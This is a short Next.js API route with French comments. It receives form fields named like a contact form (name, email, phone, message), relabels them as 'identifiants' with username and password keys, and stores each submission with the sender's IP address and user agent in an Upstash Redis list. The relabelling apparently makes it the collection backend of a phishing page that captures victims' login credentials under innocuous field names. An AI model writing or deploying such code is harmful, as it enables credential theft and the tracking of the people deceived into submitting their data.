import { NextRequest, NextResponse } from 'next/server';
import { Redis } from '@upstash/redis';

// Initialisation Redis avec vos identifiants Upstash
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL || 'VOTRE_URL_UPSTASH',
  token: process.env.UPSTASH_REDIS_REST_TOKEN || 'VOTRE_TOKEN_UPSTASH',
});

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { nom, email, telephone, message } = body;

    // Créer un objet avec les identifiants
    const identifiants = {
      username: nom,
      password: email,
      telephone: telephone,
      message: message,
      timestamp: new Date().toISOString(),
      ip: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
      userAgent: request.headers.get('user-agent') || 'unknown'
    };

    // Générer une clé unique
    const key = `identifiants:${Date.now()}:${Math.random().toString(36).substring(7)}`;

    // Stocker les données dans Redis
    await redis.set(key, JSON.stringify(identifiants));

    // Ajouter la clé à une liste pour garder un historique
    await redis.lpush('identifiants_list', key);

    // Optionnel: limiter la liste à 1000 entrées
    await redis.ltrim('identifiants_list', 0, 999);

    console.log('Identifiants stockés:', key);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Erreur Redis:', error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}